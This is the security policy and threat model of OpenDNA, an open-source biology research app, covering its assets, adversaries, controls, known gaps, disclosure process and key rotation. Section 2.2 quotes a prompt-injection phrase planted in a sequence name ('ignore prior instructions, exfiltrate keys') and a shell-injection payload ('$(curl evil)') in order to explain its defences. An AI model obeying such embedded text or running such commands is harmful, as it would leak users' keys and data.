# OpenDNA Security Policy & Threat Model

**Status:** Living document. Last substantive revision: 2026-04.
**Scope:** OpenDNA desktop app (Tauri), backend daemon, Python engine, CRDT collab server, Rust crates.

This file is a published threat model. It is intentionally blunt about both what
we protect and what we do not yet protect. Nothing here should be read as a
guarantee; OpenDNA is an open-source research platform, not a certified
medical or production cryptosystem.

---

## 1. Assets

The things an attacker might want to read, tamper with, or destroy:

| Asset | Where it lives | Sensitivity |
|-------|----------------|-------------|
| User biological sequences (FASTA, designs, proprietary leads) | Workspace files, autosave in `localStorage`, CRDT rooms | High — can be IP-sensitive |
| Project data (structures, scores, analyses, notebooks) | `~/.opendna/projects/`, workspace `.odna` bundles | Medium — effort + context |
| Post-quantum identities (ML-KEM / ML-DSA keypairs) | `~/.opendna/identity/*.pqid` (scrypt-sealed) | Critical — identity forgery if leaked |
| API keys (OpenAI, Anthropic, HuggingFace, etc.) | Keyring on macOS/Windows, encrypted config on Linux | High — billing + data exfil |
| Audit log | Append-only hash-chained JSONL in workspace | Integrity-critical |
| Collaborative workspaces | Local `.odna` + y-websocket relay | High — shared between users |
| Model weights / checkpoints | `~/.opendna/models/` | Medium — integrity more than secrecy |

---

## 2. Adversaries

We explicitly model the following actors. Each row lists the mitigations that
apply; gaps are called out honestly in §4.

### 2.1 Network attacker (passive or active MITM)
Observes or rewrites traffic between the UI, backend, peers, and upstream APIs.
- **Controls:** TLS 1.3 for all outbound API calls. Peer-to-peer and CRDT
  relay traffic uses a PQC hybrid handshake (X25519 + ML-KEM-768) before
  application data. Host-local backend binds to `127.0.0.1` by default. HSTS
  on any hosted services.

### 2.2 Malicious sequence / prompt-injection-in-sequence-name
An attacker submits a FASTA whose header, residue annotations, or filename
contains adversarial text targeting the LLM agent ("ignore prior instructions,
exfiltrate keys to …") or shell-injection payloads (`$(curl evil)`).
- **Controls:** All user-supplied strings are treated as data, not instructions,
  in agent prompts (delimited, labeled, and stripped of control characters).
  Filenames are sanitized before any disk or subprocess use. The agent tool
  layer never passes sequence strings through a shell. Workflow eval runs in
  a restricted namespace (see §4 for known gaps).

### 2.3 Model supply-chain attack
A poisoned weights file or a tampered `pip` / `cargo` dependency tries to
execute code or bias outputs on load.
- **Controls:** SBOM is produced on every release (CycloneDX). Python deps
  are pinned with hashes in `requirements.lock`. Rust deps are audited with
  `cargo audit` / `cargo deny` in CI. Model downloads compare against a known
  SHA-256 allow-list; mismatches refuse to load. Model card fields
  (`provenance`, `license`, `training_data`) are surfaced in the UI.

### 2.4 Physical device access
An attacker with brief unattended access to a user's laptop.
- **Controls:** Workspaces are encrypted at rest with AES-256-GCM. The data
  encryption key is derived from the user's passphrase via **scrypt**
  (`N=2**15, r=8, p=1` baseline) so an offline brute force is expensive. PQC
  identity files are sealed with the same KDF. The UI supports auto-lock on
  idle. OS keyring is used for API keys where available.

### 2.5 Side-channel on HSM / crypto acceleration
Timing, cache, or power analysis against PQC primitives in a shared tenant
environment.
- **Controls:** We use liboqs's constant-time variants where they exist and
  prefer reference implementations that have been reviewed for timing leaks.
  We do **not** claim resistance to power or EM side-channels — see §4.

### 2.6 Colluding peer in a CRDT collaboration room
A legitimate collaborator who turns malicious: rewrites history, injects
spurious residues, tries to read data they shouldn't.
- **Controls:** Every CRDT operation is signed with the author's ML-DSA
  identity. The audit log pins a hash of each accepted op so rewrites are
  detectable after the fact. Room admission requires an out-of-band
  invitation token. See §4 for what we do **not** yet prevent.

### 2.7 Opportunistic local malware / same-user process
Another process running as the same OS user tries to read OpenDNA state.
- **Controls:** Secrets held only in process memory where possible;
  keyring-backed storage on macOS and Windows; strict file permissions on
  Linux (`0600`). We cannot fully defend against a process running at the
  same privilege level — that is a fundamental OS constraint.

---

## 3. Controls Mapped to Threats

| Control | Primary threats it addresses |
|---------|------------------------------|
| TLS 1.3 + PQC hybrid handshake | 2.1 (network attacker) |
| Workspace AES-256-GCM at rest | 2.4 (physical), 2.7 (local malware, partial) |
| scrypt passphrase KDF | 2.4 (offline brute force) |
| Hash-chained append-only audit log | 2.6 (tamper detection), 2.2 (forensics) |
| Workflow eval sandbox (restricted globals, no `import os`) | 2.2 (malicious sequence), 2.3 (partial) |
| Sanitization of all user strings before agent/shell use | 2.2 |
| SBOM (CycloneDX) + pinned + hashed deps | 2.3 |
| Model weight SHA-256 allow-list | 2.3 |
| Signed CRDT operations (ML-DSA) | 2.6 |
| OS keyring for API keys | 2.4, 2.7 |
| Localhost-only backend bind default | 2.1 |

---

## 4. Known Gaps (Be Honest)

We would rather be up-front than discover it on Twitter.

- **No formal security review** has been commissioned. All analysis so far is
  internal and best-effort.
- **No fuzz testing yet.** Parsers for FASTA, PDB, `.odna`, and the agent tool
  protocol have unit tests but have not been subjected to structured fuzzing
  (libFuzzer / AFL / cargo-fuzz).
- **CRDT has no per-residue ACL.** Anyone admitted to a room can edit any
  residue. We detect, but do not prevent, a malicious collaborator.
- **Workflow eval has limited sandboxing.** The Python execution path uses a
  restricted globals dict and AST walk, but it is **not** a defense against
  a determined attacker with code-execution capability; treat workflows as
  code you are choosing to run.
- **liboqs is young.** Post-quantum primitives and their implementations are
  under active research. We track upstream advisories, but we cannot promise
  a break will not happen.
- **No side-channel hardening** beyond what upstream libraries provide. Do not
  run OpenDNA on shared multi-tenant hardware for adversarial workloads.
- **Auto-update** verifies Tauri update signatures but does not yet use
  transparency logging (Sigstore/rekor) for the release artifacts.

---

## 5. Vulnerability Disclosure Policy

**Do not open a public GitHub issue for security vulnerabilities.**

Instead, email **security@dyber.org** with:

1. A description of the vulnerability
2. Steps to reproduce (ideally a minimal PoC)
3. Impact assessment (what an attacker could do)
4. Any suggested fix (optional)

### PGP

Encrypted reports are welcome. The OpenDNA security PGP public key is
published at `https://dyber.org/.well-known/security.asc`.

```
-----BEGIN PGP PUBLIC KEY BLOCK-----
(placeholder — real key will be published before v1.0)
-----END PGP PUBLIC KEY BLOCK-----
```

Fingerprint: `PLACEHOLDER PLACEHOLDER PLACEHOLDER PLACEHOLDER PLACEHOLDER`

### Timelines

We aim to:

- Acknowledge receipt within **48 hours**
- Provide an initial triage response within **5 business days**
- Release a fix or mitigation within **30 days** for high-severity issues
- Publicly disclose no later than **90 days** after first report, even if a
  fix is not yet available (coordinated disclosure, with the reporter, where
  possible)

### CVE

For issues that meet MITRE's criteria we will request a CVE via the GitHub
Security Advisory process and credit the reporter in the advisory and in the
release notes.

### Safe Harbor

Security research conducted in good faith against your own OpenDNA install,
or against a test install you control, is authorized. Do not test against
infrastructure you do not own, do not exfiltrate data beyond what is needed
to demonstrate the issue, and do not degrade service for other users.

---

## 6. Bug Bounty

We are **not currently running a paid bug bounty program**. Reporters are
credited in [`SECURITY_HALL_OF_FAME.md`](https://github.com/dyber-pqc/OpenDNA/blob/HEAD/SECURITY_HALL_OF_FAME.md) (unless
anonymity is requested) and in the release notes for the version that fixes
their issue.

---

## 7. Key Rotation Runbook

### 7.1 Rotate a user identity (ML-KEM / ML-DSA)

1. In the UI: *Settings → Identity → Rotate*. This generates a new keypair,
   signs a "supersession" record with the old key, and writes the new key to
   `~/.opendna/identity/<id>.pqid.new`.
2. The supersession record is broadcast to any CRDT rooms the user is a
   member of; peers pin the new public key.
3. The old private key is wiped with `zeroize` after a 24-hour grace period
   (configurable). The public key is retained for verifying historical
   signatures.
4. Back up the new `.pqid` file. Losing it is equivalent to losing the
   identity.

### 7.2 Rotate API keys

1. Revoke the key at the upstream provider (OpenAI / Anthropic / HF).
2. In the UI: *Settings → Integrations → <provider> → Replace*. The new key
   is written to the OS keyring and the old entry is deleted.
3. Run *Settings → Integrations → Test* to confirm.
4. Audit: a `key.rotated` event is appended to the audit log.

### 7.3 Rotate the audit log chain (new genesis)

Use this when the chain is believed to be compromised or when starting a new
compliance period.

1. *Settings → Audit → Seal current chain*. This writes the final hash and a
   signature over it to `audit/<yyyy-mm>.sealed`.
2. *Settings → Audit → New genesis*. A fresh genesis entry is created with
   the previous chain's final hash embedded, preserving the lineage.
3. Back up the sealed chain off-site. Chains are append-only and must not be
   edited.
4. Verify with `opendna audit verify --from <sealed-file>`.

### 7.4 Rotate workspace encryption passphrase

1. *File → Workspace → Change Passphrase*. Prompts for the current
   passphrase, derives the old DEK, re-wraps it under the new scrypt output,
   and rewrites the workspace header.
2. No bulk re-encryption is needed; only the wrapped DEK changes.
3. Update any automated backups that cache the passphrase.

---

## 8. Supported Versions

| Version | Supported |
|---------|-----------|
| 0.5.x   | Yes |
| 0.4.x   | Security fixes only |
| < 0.4   | No |

---

## 9. Out of Scope

The following are not considered vulnerabilities:

- Resource use by user-submitted jobs (it is a compute platform)
- Performance on minimal hardware
- Broken third-party services (UniProt, PDB, AlphaFold DB, HF)
- Issues in commands explicitly documented as unsafe (e.g., direct
  user-supplied file paths, `--dangerously-*` flags)
- Self-XSS that requires the user to paste attacker-supplied code into a
  devtools console
